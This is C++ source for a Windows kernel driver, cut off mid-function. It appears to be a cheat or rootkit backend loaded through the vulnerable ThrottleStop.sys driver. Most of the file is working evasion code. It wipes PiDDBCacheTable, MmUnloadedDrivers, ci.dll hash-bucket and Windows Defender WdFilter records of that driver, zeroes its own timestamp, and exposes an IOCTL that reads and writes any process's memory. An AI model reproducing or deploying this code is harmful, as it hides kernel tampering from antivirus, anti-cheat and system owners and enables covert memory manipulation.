#include <ntifs.h>
#include <ntimage.h>
#pragma warning(disable: 4996) 

#define COMM_DEVICE_NAME   L"\\Device\\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define COMM_SYMLINK_NAME  L"\\DosDevices\\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define COMM_DEVICE_PATH   L"\\\\.\\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IOCTL_COMM         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define COMM_OP_READ       0UL
#define COMM_OP_WRITE      1UL
#define COMM_OP_GET_BASE   2UL
#define COMM_OP_GET_MODULE 3UL
#define COMM_OP_GET_STATUS 4UL
#define COMM_OP_CLEAN_VEHICLE 5UL
#define COMM_MAX_SIZE      (64UL * 1024UL * 1024UL)




#define VEHICLE_DRIVER_NAME L"ThrottleStop.sys"

struct COMM_PACKET {
    ULONG     Operation;
    ULONG     ProcessId;
    ULONGLONG AddressSrc;
    ULONGLONG AddressDst;
    ULONG     Size;
    LONG      Status;
    CHAR      ModuleName[256];
};

extern "C" POBJECT_TYPE* IoDriverObjectType;

extern "C" NTKERNELAPI NTSTATUS NTAPI ObReferenceObjectByName(
    PUNICODE_STRING ObjectName,
    ULONG           Attributes,
    PACCESS_STATE   AccessState,
    ACCESS_MASK     DesiredAccess,
    POBJECT_TYPE    ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID           ParseContext,
    PVOID*          Object
);

extern "C" NTKERNELAPI PVOID NTAPI PsGetProcessPeb(PEPROCESS Process);
extern "C" NTKERNELAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

















































#if DBG
#define LOG(fmt, ...) DbgPrint(fmt, ##__VA_ARGS__)
#else
#define LOG(fmt, ...) ((void)0)
#endif





typedef struct _MI_UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID          StartAddress;
    PVOID          EndAddress;
    LARGE_INTEGER  CurrentTime;
} MI_UNLOADED_DRIVER, *PMI_UNLOADED_DRIVER;





typedef struct _PIDDBCACHE_ENTRY {
    LIST_ENTRY     List;
    UNICODE_STRING DriverName;
    ULONG          TimeDateStamp;
    NTSTATUS       LoadStatus;
    CHAR           _pad[16];
} PIDDBCACHE_ENTRY;



typedef struct _HASH_BUCKET_ENTRY {
    struct _HASH_BUCKET_ENTRY* Next;
    UNICODE_STRING             DriverName;
} HASH_BUCKET_ENTRY, *PHASH_BUCKET_ENTRY;





extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
    PEPROCESS SourceProcess, PVOID SourceAddress,
    PEPROCESS TargetProcess, PVOID TargetAddress,
    SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

extern "C" PVOID NTAPI PsGetProcessSectionBaseAddress(PEPROCESS Process);






struct BYPASS_STATUS {
    unsigned long    WalkChainHooked;
    unsigned long    WalkChainUsedGadget;
    unsigned __int64 WalkChainGadgetVA;
    unsigned __int64 WalkChainPtrVA;
    unsigned long    CaveInstalled;
    unsigned long    _pad;
    unsigned __int64 CaveVA;
    char             CaveModule[64];
    unsigned long    PiDDBCleared;
    unsigned long    UnloadedCleared;
    unsigned long    KDUPath;
    unsigned long    _pad2;
    unsigned __int64 NtBase;
    unsigned long    VehiclePiDDBCleared;
    unsigned long    VehicleUnloadedCleared;
    unsigned long    KernelHashBucketCleared;
    unsigned long    CiDllFound;
    unsigned long    WdFilterCleared;
    unsigned long    WdFilterPatternOk;
    unsigned long    PoolStomped;
    unsigned long    _pad3;
    unsigned long    DiskSynced;        
    unsigned long    RawDiskSynced;     
    unsigned long    PoolScrubbed;
    unsigned long    _pad5;
    unsigned long    HdrPatched;        
    unsigned long    SectionHdrPatched; 
    unsigned long    WalkChainActive;         
    unsigned long    _pad7;
    unsigned __int64 WalkChainSlotVA;         
    unsigned long    KernelHashBucketEmpty;   
    unsigned long    CiGlobalsFound;          
    unsigned long    VehicleUnloadedLive;     
    unsigned long    CiSectionFound;          
    unsigned long    RawDiskStep;       
    unsigned long    RawDiskNtStatus;   
    unsigned long    RawDiskExtentCount; 
    unsigned long    RawDiskFsctlStatus; 
    unsigned long    RawDiskFirstLcnLo;  
    unsigned long    RawDiskFirstLcnHi;  
    unsigned long    RawDiskPhysNum;     
};

static BYPASS_STATUS g_drvStatus = {};





static PVOID            g_ntBase       = nullptr;
static PDEVICE_OBJECT   g_pDevice      = nullptr;

static PLDR_DATA_TABLE_ENTRY g_poisonedLdr      = nullptr;
static UNICODE_STRING        g_savedFullDllName = {};
static UNICODE_STRING        g_savedBaseDllName = {};


static PDRIVER_DISPATCH g_origDevCtrl  = nullptr;

static PDRIVER_OBJECT   g_borrowedDrv  = nullptr;



static PMI_UNLOADED_DRIVER g_mmUnloadedArr = nullptr;










static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName);

typedef struct { WORK_QUEUE_ITEM Item; ULONG Attempt; } VEHICLE_WORK;

static KTIMER        g_vehicleTimer;
static KDPC          g_vehicleDpc;
static VEHICLE_WORK  g_vehicleWork;

static VOID VehicleWorkCallback(PVOID ctx) {
    VEHICLE_WORK* w = (VEHICLE_WORK*)ctx;
    if (g_ntBase) {
        UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        ClearUnloadedEntryByName(g_ntBase, &vehicleName);
    }
    if (g_drvStatus.VehicleUnloadedCleared == 0 && ++(w->Attempt) < 5) {
        LARGE_INTEGER due;
        due.QuadPart = -20000000LL; 
        KeSetTimer(&g_vehicleTimer, due, &g_vehicleDpc);
    }
}

static VOID VehicleTimerDpc(PKDPC, PVOID ctx, PVOID, PVOID) {
    VEHICLE_WORK* w = (VEHICLE_WORK*)ctx;
    ExInitializeWorkItem(&w->Item, VehicleWorkCallback, w);
    ExQueueWorkItem(&w->Item, DelayedWorkQueue);
}





static void** g_pWalkChainPtr = nullptr;
static void*  g_origWalkChain = nullptr;






static PVOID GetNtKernelBase(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject) return nullptr;
    
    
    
    PVOID result = nullptr;
    __try {
        PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
        if (!ldr || !MmIsAddressValid(ldr)) return nullptr;
        UNICODE_STRING ntName;
        RtlInitUnicodeString(&ntName, L"ntoskrnl.exe");
        PLIST_ENTRY head = &ldr->InLoadOrderLinks;
        ULONG guard = 0;
        for (PLIST_ENTRY cur = head->Flink;
             cur && cur != head && ++guard < 512;
             cur = cur->Flink) {
            if (!MmIsAddressValid(cur)) break;
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (entry->BaseDllName.Buffer &&
                RtlEqualUnicodeString(&entry->BaseDllName, &ntName, TRUE)) {
                result = entry->DllBase;
                break;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = nullptr;
    }
    return result;
}




static PVOID GetNtKernelBaseAlt() {
    static const WCHAR* const kExports[] = {
        L"RtlWalkFrameChain",
        L"MmGetPhysicalAddress",
    };
    for (ULONG e = 0; e < ARRAYSIZE(kExports); e++) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, kExports[e]);
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
        if (!fn) continue;
        PUCHAR page = (PUCHAR)((ULONG_PTR)fn & ~0xFFFULL);
        for (ULONG i = 0; i < 0x1000; i++, page -= 0x1000) {
            if (!MmIsAddressValid(page)) continue;
            if (*(USHORT*)page != IMAGE_DOS_SIGNATURE) continue;
            
            
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)page;
            if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x800) continue;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(page + dos->e_lfanew);
            if (!MmIsAddressValid(nt)) continue;
            if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
            
            ULONG imgSize = nt->OptionalHeader.SizeOfImage;
            if (imgSize == 0 || fn < page || fn >= page + imgSize) continue;
            return page;
        }
    }
    return nullptr;
}





static BOOLEAN GetImageSection(PVOID imageBase, const char* name,
                                PUCHAR* outBase, PSIZE_T outSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (strncmp((char*)sec->Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            *outBase = (PUCHAR)imageBase + sec->VirtualAddress;
            *outSize = (SIZE_T)sec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}


static BOOLEAN IsKernelPointer(PVOID addr) {
    return (ULONG_PTR)addr >= 0xFFFF800000000000ULL && MmIsAddressValid(addr);
}


static PUCHAR PatternScan(PUCHAR base, SIZE_T size, const UCHAR* pat, SIZE_T patLen) {
    if (size < patLen) return nullptr;
    for (SIZE_T i = 0; i <= size - patLen; i++) {
        BOOLEAN ok = TRUE;
        for (SIZE_T j = 0; j < patLen; j++) {
            if (pat[j] != 0xFF && base[i + j] != pat[j]) { ok = FALSE; break; }
        }
        if (ok) return base + i;
    }
    return nullptr;
}



















static BOOLEAN FindPiDDBTable(PVOID ntBase, PERESOURCE* outLock, PRTL_AVL_TABLE* outTable) {
    static const UCHAR patLock[] = {
        0x48, 0x8D, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF,  
        0xB2, 0x01,                                  
        0x66, 0xFF, 0x88, 0xFF, 0xFF, 0xFF, 0xFF,   
        0x90,                                        
        0xE8                                         
    };
    static const UCHAR patTable[] = {
        0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D  
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ntBase, "PAGE", &pageBase, &pageSize)) return FALSE;

    PUCHAR matchLock  = PatternScan(pageBase, pageSize, patLock,  sizeof(patLock));
    PUCHAR matchTable = PatternScan(pageBase, pageSize, patTable, sizeof(patTable));

    if (!matchLock)  { LOG("[!] FindPiDDBTable: PiDDBLock pattern not found in PAGE\n");      return FALSE; }
    if (!matchTable) { LOG("[!] FindPiDDBTable: PiDDBCacheTable pattern not found in PAGE\n"); return FALSE; }

    
    PERESOURCE     pLock  = (PERESOURCE)    (matchLock  + 7  + *(LONG*)(matchLock  + 3));
    
    PRTL_AVL_TABLE pTable = (PRTL_AVL_TABLE)(matchTable + 12 + *(LONG*)(matchTable + 8));

    if (!IsKernelPointer(pLock) || !IsKernelPointer(pTable)) {
        LOG("[!] FindPiDDBTable: resolved pointers invalid (lock=%p table=%p)\n", pLock, pTable);
        return FALSE;
    }

    *outLock  = pLock;
    *outTable = pTable;
    return TRUE;
}


static VOID ClearPiDDBCacheTable(PDRIVER_OBJECT DriverObject, PVOID ntBase) {
    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!ldr || !ldr->DllBase) return;
    PIMAGE_NT_HEADERS ntHdr = RtlImageNtHeader(ldr->DllBase);
    if (!ntHdr) return;
    ULONG ts = ntHdr->FileHeader.TimeDateStamp;

    PERESOURCE pLock; PRTL_AVL_TABLE pTable;
    if (!FindPiDDBTable(ntBase, &pLock, &pTable)) return;

    ExAcquireResourceExclusiveLite(pLock, TRUE);
    PIDDBCACHE_ENTRY search = {};
    search.TimeDateStamp = ts;
    PVOID found = RtlLookupElementGenericTableAvl(pTable, &search);
    if (found) {
        RemoveEntryList((PLIST_ENTRY)found);
        RtlDeleteElementGenericTableAvl(pTable, found);
        g_drvStatus.PiDDBCleared = 1;
        LOG("[+] ClearPiDDBCacheTable: removed ts=0x%08X\n", ts);
    }
    ExReleaseResourceLite(pLock);
}





static VOID ClearPiDDBEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PERESOURCE pLock; PRTL_AVL_TABLE pTable;
    if (!FindPiDDBTable(ntBase, &pLock, &pTable)) return;

    ExAcquireResourceExclusiveLite(pLock, TRUE);

    PVOID toDelete[16] = {};
    ULONG count = 0;
    for (PVOID node = RtlEnumerateGenericTableAvl(pTable, TRUE);
         node && count < ARRAYSIZE(toDelete);
         node = RtlEnumerateGenericTableAvl(pTable, FALSE)) {
        PIDDBCACHE_ENTRY* e = (PIDDBCACHE_ENTRY*)node;
        if (e->DriverName.Buffer &&
            RtlEqualUnicodeString(&e->DriverName, targetName, TRUE))
            toDelete[count++] = node;
    }
    for (ULONG i = 0; i < count; i++) {
        RemoveEntryList((PLIST_ENTRY)toDelete[i]);
        RtlDeleteElementGenericTableAvl(pTable, toDelete[i]);
        g_drvStatus.VehiclePiDDBCleared = 1;
    }
    LOG("[+] ClearPiDDBEntryByName: deleted %u entries for %wZ\n", count, targetName);

    ExReleaseResourceLite(pLock);
}


static PMI_UNLOADED_DRIVER FindMmUnloadedArray(PVOID ntBase) {
    static const UCHAR pat[] = { 0x4C, 0x8B, 0x15, 0xFF, 0xFF, 0xFF, 0xFF };
    PUCHAR textBase; SIZE_T textSize;
    if (!GetImageSection(ntBase, ".text", &textBase, &textSize)) return nullptr;
    PUCHAR match = PatternScan(textBase, textSize, pat, sizeof(pat));
    if (!match) { LOG("[!] FindMmUnloadedArray: pattern not found\n"); return nullptr; }
    PVOID* arrSlot = (PVOID*)(match + 7 + *(LONG*)(match + 3));
    if (!IsKernelPointer(arrSlot)) return nullptr;
    PMI_UNLOADED_DRIVER arr = *(PMI_UNLOADED_DRIVER*)arrSlot;
    if (!arr || !IsKernelPointer(arr)) return nullptr;
    return arr;
}


static VOID ClearMmUnloadedDrivers(PDRIVER_OBJECT DriverObject, PVOID ntBase) {
    PMI_UNLOADED_DRIVER arr = FindMmUnloadedArray(ntBase);
    if (!arr) return;
    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    for (ULONG i = 0; i < 50; i++) {
        if (arr[i].Name.Buffer &&
            RtlEqualUnicodeString(&arr[i].Name, &ldr->BaseDllName, TRUE)) {
            RtlZeroMemory(&arr[i], sizeof(MI_UNLOADED_DRIVER));
            g_drvStatus.UnloadedCleared = 1;
            LOG("[+] ClearMmUnloadedDrivers: zeroed slot %u\n", i);
        }
    }
}


static VOID ClearUnloadedEntryByName(PVOID ntBase, PUNICODE_STRING targetName) {
    PMI_UNLOADED_DRIVER arr = FindMmUnloadedArray(ntBase);
    if (!arr) return;
    for (ULONG i = 0; i < 50; i++) {
        if (arr[i].Name.Buffer &&
            RtlEqualUnicodeString(&arr[i].Name, targetName, TRUE)) {
            RtlZeroMemory(&arr[i], sizeof(MI_UNLOADED_DRIVER));
            g_drvStatus.VehicleUnloadedCleared = 1;
            LOG("[+] ClearUnloadedEntryByName: zeroed slot %u for %wZ\n", i, targetName);
        }
    }
}







static PVOID GetNtExport(PVOID moduleBase, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PUCHAR)moduleBase + dos->e_lfanew);
    ULONG expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return nullptr;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + expRva);
    PULONG  funcs = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfFunctions);
    PULONG  names = (PULONG) ((PUCHAR)moduleBase + exp->AddressOfNames);
    PUSHORT ords  = (PUSHORT)((PUCHAR)moduleBase + exp->AddressOfNameOrdinals);
    for (ULONG i = 0; i < exp->NumberOfNames; i++) {
        const char* exportName = (const char*)((PUCHAR)moduleBase + names[i]);
        if (_stricmp(exportName, name) == 0)
            return (PVOID)((PUCHAR)moduleBase + funcs[ords[i]]);
    }
    return nullptr;
}


static PLDR_DATA_TABLE_ENTRY FindModuleLdrEntry(PVOID ntBase, PCWSTR name) {
    PVOID listPtr = GetNtExport(ntBase, "PsLoadedModuleList");
    if (!listPtr || !IsKernelPointer(listPtr)) return nullptr;
    UNICODE_STRING target;
    RtlInitUnicodeString(&target, name);
    PLIST_ENTRY head = (PLIST_ENTRY)listPtr;
    for (PLIST_ENTRY e = head->Flink; e && e != head; e = e->Flink) {
        if (!MmIsAddressValid(e)) break;
        PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!MmIsAddressValid(ldr->BaseDllName.Buffer)) continue;
        if (RtlEqualUnicodeString(&ldr->BaseDllName, &target, TRUE))
            return ldr;
    }
    return nullptr;
}


static PVOID FindModuleBase(PVOID ntBase, PCWSTR moduleName) {
    PVOID listPtr = GetNtExport(ntBase, "PsLoadedModuleList");
    if (!listPtr || !IsKernelPointer(listPtr)) return nullptr;

    UNICODE_STRING target;
    RtlInitUnicodeString(&target, moduleName);

    PLIST_ENTRY head = (PLIST_ENTRY)listPtr;
    for (PLIST_ENTRY e = head->Flink; e && e != head; e = e->Flink) {
        if (!MmIsAddressValid(e)) break;
        PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!MmIsAddressValid(ldr->BaseDllName.Buffer)) continue;
        if (RtlEqualUnicodeString(&ldr->BaseDllName, &target, TRUE))
            return ldr->DllBase;
    }
    return nullptr;
}





static BOOLEAN FindCiHashGlobals(PVOID ciBase, PVOID* outList, PERESOURCE* outLock) {
    static const UCHAR pat[] = {
        0x48, 0x8B, 0x1D, 0xFF, 0xFF, 0xFF, 0xFF,  
        0xFF, 0xFF,                                  
        0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00   
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(ciBase, "PAGE", &pageBase, &pageSize)) return FALSE;
    g_drvStatus.CiSectionFound = 1;

    PUCHAR match = PatternScan(pageBase, pageSize, pat, sizeof(pat));
    if (!match) { LOG("[!] FindCiHashGlobals: pattern not found in PAGE\n"); return FALSE; }

    
    *outList = (PVOID)(match + 7 + *(LONG*)(match + 3));

    
    SIZE_T lookback = (SIZE_T)(match - pageBase);
    if (lookback > 50) lookback = 50;
    for (SIZE_T j = lookback; j >= 7; j--) {
        PUCHAR q = match - j;
        if (q[0] != 0x48 || q[1] != 0x8D || q[2] != 0x0D) continue;
        *outLock = (PERESOURCE)(q + 7 + *(LONG*)(q + 3));
        LOG("[+] FindCiHashGlobals: list=%p lock=%p\n", *outList, *outLock);
        return TRUE;
    }

    LOG("[!] FindCiHashGlobals: lock not found within 50 bytes of pattern\n");
    return FALSE;
}


static VOID ClearKernelHashBucketList(PVOID ntBase) {
    PVOID ciBase = FindModuleBase(ntBase, L"ci.dll");
    if (!ciBase) { LOG("[!] ClearKernelHashBucketList: ci.dll not found\n"); return; }
    g_drvStatus.CiDllFound = 1;

    PVOID listHead; PERESOURCE lock;
    if (!FindCiHashGlobals(ciBase, &listHead, &lock)) return;
    g_drvStatus.CiGlobalsFound = 1;

    UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);

    KeEnterCriticalRegion();
    ExAcquireResourceExclusiveLite(lock, TRUE);

    
    if (*(PHASH_BUCKET_ENTRY*)listHead == nullptr) {
        g_drvStatus.KernelHashBucketEmpty = 1;
        LOG("[+] ClearKernelHashBucketList: list empty (HVCI off, no entries)\n");
        ExReleaseResourceLite(lock);
        KeLeaveCriticalRegion();
        return;
    }

    
    
    PHASH_BUCKET_ENTRY* prev  = (PHASH_BUCKET_ENTRY*)listHead;
    PHASH_BUCKET_ENTRY  entry = nullptr;

    while ((ULONG_PTR)prev >= 0xFFFF800000000000ULL && (entry = *prev) != nullptr) {
        
        
        if ((ULONG_PTR)entry < 0xFFFF800000000000ULL) break;

        UNICODE_STRING* fullPath = &entry->DriverName;
        if (fullPath->Buffer && fullPath->Length > 0 &&
            (ULONG_PTR)fullPath->Buffer >= 0xFFFF800000000000ULL) {
            
            UNICODE_STRING baseName = *fullPath;
            for (USHORT i = fullPath->Length / sizeof(WCHAR); i > 0; i--) {
                if (fullPath->Buffer[i - 1] == L'\\') {
                    baseName.Buffer        = fullPath->Buffer + i;
                    baseName.Length        = fullPath->Length - (USHORT)(i * sizeof(WCHAR));
                    baseName.MaximumLength = baseName.Length;
                    break;
                }
            }
            if (RtlEqualUnicodeString(&baseName, &vehicleName, TRUE)) {
                *prev = entry->Next;
                ExFreePoolWithTag(entry, 0);
                g_drvStatus.KernelHashBucketCleared = 1;
                LOG("[+] ClearKernelHashBucketList: removed entry for %wZ\n", &vehicleName);
                break;
            }
        }
        prev = &entry->Next;
    }

    ExReleaseResourceLite(lock);
    KeLeaveCriticalRegion();
}





typedef void (NTAPI *MpFreeDriverInfoExFn)(PVOID);






















static BOOLEAN FindWdFilterGlobals(PVOID           wdBase,
                                   PLIST_ENTRY*    outHead,
                                   ULONG**         outCount,
                                   PVOID**         outArray,
                                   MpFreeDriverInfoExFn* outFree)
{
    static const UCHAR patList[] = {
        0x48, 0x8B, 0x0D, 0xFF, 0xFF, 0xFF, 0xFF,  
        0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF,          
        0x48, 0x39, 0x11                              
    };
    static const UCHAR patFree[] = {
        0x89, 0xFF, 0x08,                                          
        0xE8, 0xFF, 0xFF, 0xFF, 0xFF,                              
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                  
        0xE9                                                        
    };

    PUCHAR pageBase; SIZE_T pageSize;
    if (!GetImageSection(wdBase, "PAGE", &pageBase, &pageSize)) return FALSE;

    PUCHAR matchList = PatternScan(pageBase, pageSize, patList, sizeof(patList));
    PUCHAR matchFree = PatternScan(pageBase, pageSize, patFree, sizeof(patFree));

    if (!matchList) { LOG("[!] WdFilter: list pattern not found in PAGE\n"); return FALSE; }
    if (!matchFree) { LOG("[!] WdFilter: free pattern not found in PAGE\n"); return FALSE; }

    
    PVOID* pBlink = (PVOID*)(matchList + 7 + *(INT32*)(matchList + 3));
    
    PLIST_ENTRY pHead = (PLIST_ENTRY)((PUCHAR)pBlink - sizeof(PVOID));

    
    ULONG* pCount = (ULONG*)(matchList + 13 + *(INT32*)(matchList + 9));

    
    PVOID* pArray = *(PVOID**)((PUCHAR)pCount + 8);

    
    MpFreeDriverInfoExFn fn = (MpFreeDriverInfoExFn)(matchFree + 8 + *(INT32*)(matchFree + 4));

    if (!IsKernelPointer(pHead) || !IsKernelPointer(pCount) || !IsKernelPointer(fn)) {
        LOG("[!] WdFilter: resolved pointers invalid\n");
        return FALSE;
    }

    *outHead  = pHead;
    *outCount = pCount;
    *outArray = pArray;
    *outFree  = fn;
    g_drvStatus.WdFilterPatternOk = 1;
    return TRUE;
}

static VOID ClearWdFilterDriverList(PVOID ntBase) {
    PVOID wdBase = FindModuleBase(ntBase, L"WdFilter.sys");
    if (!wdBase) { LOG("[!] WdFilter: not loaded, skip\n"); return; }

    PLIST_ENTRY          pHead;
    ULONG*               pCount;
    PVOID*               pArray;
    MpFreeDriverInfoExFn MpFreeDriverInfoEx;
    if (!FindWdFilterGlobals(wdBase, &pHead, &pCount, &pArray, &MpFreeDriverInfoEx))
        return;

    UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);

    for (PLIST_ENTRY entry = pHead->Flink;
         entry && entry != pHead && MmIsAddressValid(entry);
         entry = entry->Flink)
    {
        UNICODE_STRING* ustr = (UNICODE_STRING*)((PUCHAR)entry + 0x10);
        if (!ustr->Buffer || !ustr->Length || !MmIsAddressValid(ustr->Buffer))
            continue;

        UNICODE_STRING baseName = *ustr;
        for (USHORT i = ustr->Length / sizeof(WCHAR); i > 0; i--) {
            if (ustr->Buffer[i - 1] == L'\\') {
                baseName.Buffer        = ustr->Buffer + i;
                baseName.Length        = ustr->Length - (USHORT)(i * sizeof(WCHAR));
                baseName.MaximumLength = baseName.Length;
                break;
            }
        }
        if (!RtlEqualUnicodeString(&baseName, &vehicleName, TRUE))
            continue;

        
        
        PVOID sameIndexList = (PVOID)((PUCHAR)entry - 0x10);
        if (pArray) {
            PVOID sentinel = (PVOID)((PUCHAR)pCount + 1);
            for (int k = 0; k < 256; k++) {
                if (!MmIsAddressValid(&pArray[k])) break;
                if (pArray[k] == sameIndexList) { pArray[k] = sentinel; break; }
            }
        }

        RemoveEntryList(entry);
        (*pCount)--;

        
        PVOID  driverInfo = (PVOID)((PUCHAR)entry - 0x20);
        USHORT magic      = *(USHORT*)driverInfo;
        if (magic == 0xDA18) {
            MpFreeDriverInfoEx(driverInfo);
        } else {
            LOG("[!] WdFilter: magic mismatch (0x%04X), skipping free\n", magic);
        }

        LOG("[+] WdFilter: removed entry for %wZ\n", &vehicleName);
        g_drvStatus.WdFilterCleared = 1;
        return;
    }
    LOG("[!] WdFilter: vehicle entry not in list\n");
}

static VOID ZeroOwnTimestamp(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject) return;
    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!ldr || !ldr->DllBase) return;
    PIMAGE_NT_HEADERS nt = RtlImageNtHeader(ldr->DllBase);
    if (nt) nt->FileHeader.TimeDateStamp = 0;
}





static NTSTATUS KernelRead(PEPROCESS Process, PVOID src, PVOID dst, SIZE_T size) {
    SIZE_T bytes = 0;
    return MmCopyVirtualMemory(Process, src, PsGetCurrentProcess(), dst,
                               size, UserMode, &bytes);
}

static NTSTATUS KernelWrite(PEPROCESS Process, PVOID src, PVOID dst, SIZE_T size) {
    SIZE_T bytes = 0;
    return MmCopyVirtualMemory(PsGetCurrentProcess(), src, Process, dst,
                               size, UserMode, &bytes);
}







static NTSTATUS SafeReadVm(PEPROCESS proc, UINT64 addr, PVOID dst, SIZE_T size) {
    if (addr == 0) return STATUS_ACCESS_VIOLATION;
    SIZE_T bytes = 0;
    return MmCopyVirtualMemory(proc, (PVOID)addr, PsGetCurrentProcess(), dst,
                               size, KernelMode, &bytes);
}

static UINT64 FindModuleBase(PEPROCESS process, const CHAR* name) {
    PVOID pebRaw = PsGetProcessPeb(process);
    if (!pebRaw) return 0;

    UINT64 peb = (UINT64)pebRaw;
    UINT64 ldr = 0;
    if (!NT_SUCCESS(SafeReadVm(process, peb + 0x18, &ldr, sizeof(ldr))) || !ldr)
        return 0;

    UINT64 listHead = ldr + 0x20;
    UINT64 flink = 0;
    if (!NT_SUCCESS(SafeReadVm(process, listHead, &flink, sizeof(flink))) || !flink)
        return 0;

    for (INT guard = 0; guard < 512 && flink && flink != listHead; guard++) {
        UINT64 entry = flink - 0x10;

        UINT64 dllBase = 0;
        USHORT nameLen = 0;
        UINT64 nameBuf = 0;

        SafeReadVm(process, entry + 0x30, &dllBase, sizeof(dllBase));
        SafeReadVm(process, entry + 0x58, &nameLen, sizeof(nameLen));
        SafeReadVm(process, entry + 0x60, &nameBuf, sizeof(nameBuf));

        if (nameBuf && nameLen >= 2 && nameLen <= 512) {
            WCHAR wide[256] = {};
            ULONG copyLen = min((ULONG)nameLen, (ULONG)(sizeof(wide) - sizeof(WCHAR)));
            if (NT_SUCCESS(SafeReadVm(process, nameBuf, wide, copyLen))) {
                wide[copyLen / sizeof(WCHAR)] = L'\0';

                ULONG wlen = copyLen / sizeof(WCHAR);
                ULONG nlen = (ULONG)strlen(name);
                BOOLEAN match = (wlen == nlen);
                for (ULONG j = 0; j < wlen && match; j++) {
                    WCHAR wc = wide[j];
                    CHAR  nc = name[j];
                    if (wc >= L'A' && wc <= L'Z') wc += 32;
                    if (nc >= 'A'  && nc <= 'Z')  nc += 32;
                    if (wc != (WCHAR)(UCHAR)nc) match = FALSE;
                }
                if (match) return dllBase;
            }
        }

        UINT64 next = 0;
        if (!NT_SUCCESS(SafeReadVm(process, flink, &next, sizeof(next))))
            break;
        flink = next;
    }

    return 0;
}






static VOID ProcessCommPacket(COMM_PACKET* pkt) {
    PEPROCESS proc = nullptr;

    switch (pkt->Operation) {

    case COMM_OP_READ:
        if (pkt->Size == 0 || pkt->Size > COMM_MAX_SIZE) {
            pkt->Status = STATUS_INVALID_PARAMETER;
            break;
        }
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &proc);
        if (NT_SUCCESS(pkt->Status)) {
            pkt->Status = KernelRead(proc, (PVOID)pkt->AddressSrc,
                                     (PVOID)pkt->AddressDst, pkt->Size);
            ObDereferenceObject(proc);
        }
        break;

    case COMM_OP_WRITE:
        if (pkt->Size == 0 || pkt->Size > COMM_MAX_SIZE) {
            pkt->Status = STATUS_INVALID_PARAMETER;
            break;
        }
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &proc);
